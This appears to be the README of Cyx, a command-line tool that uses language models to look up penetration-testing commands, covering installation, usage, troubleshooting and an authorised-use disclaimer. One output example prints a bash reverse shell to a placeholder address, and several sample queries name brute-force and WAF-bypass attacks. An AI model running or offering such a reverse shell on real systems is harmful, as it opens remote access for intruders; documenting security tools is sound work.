# Cyx

LLM-powered terminal tool for security command lookup. Supports Perplexity, Groq, and Ollama.

## Features

- Command-first output with code blocks
- Learn mode for detailed explanations
- Smart cache with ONNX semantic search
- Local LLM support via Ollama
- Source attribution and links

## Quick Start

```bash
# Install with one command
curl -sSL https://raw.githubusercontent.com/neur0map/cyx/master/install.sh | bash

# Or build from source
git clone https://github.com/neur0map/cyx.git
cd cyx
make install

# First time setup
cyx setup

# Use
cyx "nmap stealth scan"
cyx "sql injection bypass waf"
cyx --learn "linux privilege escalation"
```

## Installation

### Quick Install (Recommended)

**One-line installer** for Linux/macOS:

```bash
curl -sSL https://raw.githubusercontent.com/neur0map/cyx/master/install.sh | bash
```

This will:
- Download the latest release for your platform
- Install to `~/.local/bin` (or custom location via `INSTALL_DIR`)
- Handle the ONNX Runtime library automatically
- Add to PATH if needed
- Run the setup wizard

**Custom installation directory:**
```bash
INSTALL_DIR=/usr/local/bin curl -sSL https://raw.githubusercontent.com/neur0map/cyx/master/install.sh | bash
```

### Manual Installation

**Note**: Pre-built binaries will be available in GitHub Releases after tagging a new version (see below for instructions).

Download the latest release from [Releases page](https://github.com/neur0map/cyx/releases) and run:

```bash
# Extract the archive
tar -xzf cyx-v0.2.1-linux-x86_64.tar.gz
cd cyx-v0.2.1-linux-x86_64

# Run the installer script
bash install.sh
```

Or manually copy both files:
```bash
mkdir -p ~/.local/bin
cp cyx ~/.local/bin/
cp libonnxruntime* ~/.local/bin/
export PATH="$HOME/.local/bin:$PATH"
cyx setup
```

**Important**: The `cyx` binary requires the ONNX Runtime library. Both files must be kept together in the same directory.

### Build from Source

#### Prerequisites

- Rust 1.70 or higher
- API key from [Perplexity](https://www.perplexity.ai/settings/api) or [Groq](https://console.groq.com)

#### Quick Build

```bash
git clone https://github.com/neur0map/cyx.git
cd cyx
make install  # Builds, installs binary and library
cyx setup
```

#### Using Cargo Install

```bash
# Clone and navigate to the repository
git clone https://github.com/neur0map/cyx.git
cd cyx

# Install the binary
cargo install --path .

# Run setup - it will auto-detect and fix ONNX library issues
cyx setup
```

**Auto-Fix Feature**: When you run `cyx setup` or any command, cyx will automatically detect if the ONNX Runtime library is missing and attempt to fix it by:
1. Locating the library in your cargo build cache
2. Copying it to the binary directory
3. Providing manual instructions if auto-fix fails

**Manual Copy** (if auto-fix doesn't work):
```bash
INSTALL_DIR=$(dirname $(which cyx))
cp target/release/libonnxruntime* $INSTALL_DIR/
```

#### Makefile Commands

```bash
make build    # Build and create symlink for development
make check    # Run fmt + clippy
make install  # Install to system (includes library)
make setup    # Run setup wizard
make help     # Show all commands
```

### Initial Configuration

After installation, run the interactive setup wizard:

```bash
cyx setup
```

This creates `~/.config/cyx/config.toml` with your API key (stored with 600 permissions).

## Usage

### One-Shot Queries

```bash
# Quick command lookup
cyx "reverse shell one liner"
cyx "hydra ssh brute force"

# Learn mode with detailed explanations
cyx --learn "metasploit meterpreter"
cyx -l "nmap service detection"
```


### CLI Options

```
-l, --learn          Educational mode with detailed breakdowns
-q, --quiet          Minimal output (response only, no formatting)
-v, --verbose        Detailed progress information
    --no-tty         Disable TTY features for scripting
```

### Configuration

```bash
cyx config show                           # View current config
cyx config set provider perplexity        # Change provider
cyx setup                                 # Re-run setup wizard
```

Config file: `~/.config/cyx/config.toml`

## Output Examples

### Normal Mode

```
╭─── RESPONSE ──────────────────────────────────────────────
│ ```bash
│ nmap -sS <target>
│ ```
│ TCP SYN stealth scan - doesn't complete handshake. Requires root.
╰──────────────────────────────────────────────────────────

[*] SOURCES
───────────────────────────────────────
Provider: Perplexity (sonar-pro)
Search: Yes (performed web search)

Links:
  - nmap documentation: https://nmap.org/book/synscan.html
  - TCP protocol (RFC 793): https://www.ietf.org/rfc/rfc793.txt
```

### Learn Mode

```bash
cyx --learn "nmap stealth scan"
```

Provides detailed explanations with flag breakdowns, protocol details, and alternatives.

### Quiet Mode

```bash
$ cyx -q "reverse shell bash"
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

## Troubleshooting

### Error: libonnxruntime.so.1.16.0: cannot open shared object file

This error means the ONNX Runtime library is not in the library search path.

**Automatic Fix:**

Simply run:
```bash
cyx setup
```

Cyx will automatically detect the missing library and attempt to fix it by:
- Searching for the library in your cargo build cache
- Copying it to the correct location
- Providing manual instructions if needed

**Manual Solutions:**

If auto-fix doesn't work:

1. **For cargo install users**:
   ```bash
   # Copy from build cache
   INSTALL_DIR=$(dirname $(which cyx))
   cp target/release/libonnxruntime* $INSTALL_DIR/
   ```

2. **For release downloads**: Extract the full archive and ensure both files are together:
   ```bash
   # Both files should be in the same directory
   ls -l
   # Should show: cyx and libonnxruntime.so.1.16.0 (or .dylib on macOS)
   ```

3. **System-wide installation**:
   ```bash
   sudo cp libonnxruntime* /usr/local/lib/
   sudo ldconfig  # Linux only
   ```

For more detailed troubleshooting, see [BUILDING.md](BUILDING.md).

## Creating a Release

To create a new release with automated binary builds for all platforms:

```bash
# Update version in Cargo.toml, then commit
git add Cargo.toml
git commit -m "Bump version to v0.2.2"

# Create and push a version tag
git tag v0.2.2
git push origin master
git push origin v0.2.2
```

This triggers the GitHub Actions workflow which will:
- Build binaries for Linux (x86_64, aarch64) and macOS (x86_64, aarch64)
- Bundle each binary with the ONNX Runtime library
- Include the install.sh script in release packages
- Create a GitHub Release with all artifacts
- Generate SHA256 checksums for verification

## Technical Details

### Security

- API keys stored with 600 permissions in `~/.config/cyx/config.toml`
- Read-only operation - provides commands but never executes them
- Timeout protection - all API calls timeout after 120 seconds
- Local-first - all sensitive data remains on your machine

### System Prompts

Normal mode prioritizes executable commands with brief explanations. Learn mode provides detailed educational content with examples and alternatives.

## Disclaimer

**For authorized security testing, educational purposes, and defensive research only.**

This tool is designed for:
- Professional penetration testers with written authorization
- Security students in controlled lab environments
- Capture The Flag (CTF) competitions
- Defensive security and threat analysis

Always obtain explicit permission before testing systems you don't own.

## License

MIT License - See [LICENSE](LICENSE) for details.
